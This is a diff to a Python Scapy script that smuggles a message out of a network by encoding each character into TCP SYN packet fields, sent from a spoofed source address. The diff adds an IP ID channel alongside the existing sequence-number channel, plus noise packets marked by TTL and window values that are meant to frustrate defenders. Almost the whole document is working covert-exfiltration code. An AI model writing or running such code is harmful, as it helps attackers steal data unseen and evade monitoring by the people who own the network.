@@ -86,14 +86,26 @@ interfaces = netifaces.interfaces()
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
 # to its decimal equivalent.. which will be multiplied by the multiplier.
-def convert_message(message):
-	print '[*] converting message: %s' % message
+def convert_iseq(message):
+	print '[*] converting iseq message: %s' % message
 	for char in message:
 		c = ord(char)
 		# While we are here, might as well generate our SYN packet sequence
 		# number.
 		exfilChar = c * multiplier
-		# Add seq to the global seq_array.
+		# Add seq to the global exfilArray.
+		exfilArray.append(exfilChar)
+		print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
+
+
+def convert_ipid(message):
+	print '[*] converting ipid message: %s' % message
+	for char in message:
+		c = ord(char)
+		# While we are here, might as well generate our SYN packet sequence
+		# number.
+		exfilChar = c * 256
+		# Add to the global exfilArray.
 		exfilArray.append(exfilChar)
 		print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
 
@@ -115,8 +127,8 @@ def trim_message(message):
 	return trimmed
 
 
-def add_n0ise(i):
-	print '[*] adding n0ise..'
+def add_n0ise_iseq(i):
+	print '[*] adding n0ise to iseq..'
 	y = exfilArray[i]
 	# Add some randomness for schlitz n giggles
 	randy = random.randint(-99999999, 99999999)
@@ -127,9 +139,28 @@ def add_n0ise(i):
 	send(pkt)
 
 
+def add_n0ise_ipid(i):
+	print '[*] adding n0ise to IPID..'
+	y = exfilArray[i]
+	# Add some randomness for schlitz n giggles
+	randy = random.randint(-999, 999)
+	pkt.seq = y + randy
+	# Signal noisy packet
+	pkt.window = int(8182) - random.randint(23, 275)
+	pkt.ttl = 128
+	send(pkt)
+
+
 def exfil_ipid():
 	print '[*] Attempting ID identification exfil..'
 	i = 0
+	for c in exfilArray:
+		add_n0ise_ipid(i)
+		pkt.ttl = 68
+		pkt.id = exfilArray[i]
+		time.sleep(0.4)
+		send(pkt)
+		i += 1
 
 
 # Send message using initial sequence numbers. Add noise.
@@ -137,12 +168,12 @@ def exfil_iseq():
 	i = 0
 	k = 8192  # window size
 	for c in exfilArray:
-		add_n0ise(i)
+		add_n0ise_iseq(i)
 		pkt.window = k
 		pkt.ttl = 64
 		pkt.seq = exfilArray[i]
 		# slow our roll
-		time.sleep(0.5)
+		time.sleep(0.4)
 		send(pkt)
 		i += 1
 
@@ -183,30 +214,38 @@ def send_iface():
 # Main program
 # ============
 
+# ==== use iseq
 # Convert our original message. Later we'll update our message and send
 # network interface data.
-convert_message(message)
-
+convert_iseq(message)
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
 # that's complex enough to at least frustrate our adversaries.
 msglen = len(exfilArray)
-
 # Craft our basic packet.
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
 pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')
-
 # Attempt data exfiltration using initial sequence numbers
 exfil_iseq()
+print '[*] Sent using iseq: %s' % message
 
 exfilArray = []  # clear before each use
 
-print '[*] Sent: %s' % message
-print '[*] Getting ready to send network interface details'
-print '[*] Resetting message and seq_array'
+# ==== use IPID
+print '[*] Testing method IPID..'
+pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')
+convert_ipid(message)
+msglen = len(exfilArray)
+exfil_ipid()
+print '[*] Sent using IPID: %s' % message
 
-message = ''
-exfilArray = []
-
-# FIXME: sending interface details is not working
-send_iface()
+#exfilArray = []
+# ====
+#print '[*] Getting ready to send network interface details'
+#print '[*] Resetting message and exfilArray'
+#
+#message = ''
+#exfilArray = []
+#
+## FIXME: something was messing up.. seems to work OK now.
+#send_iface()
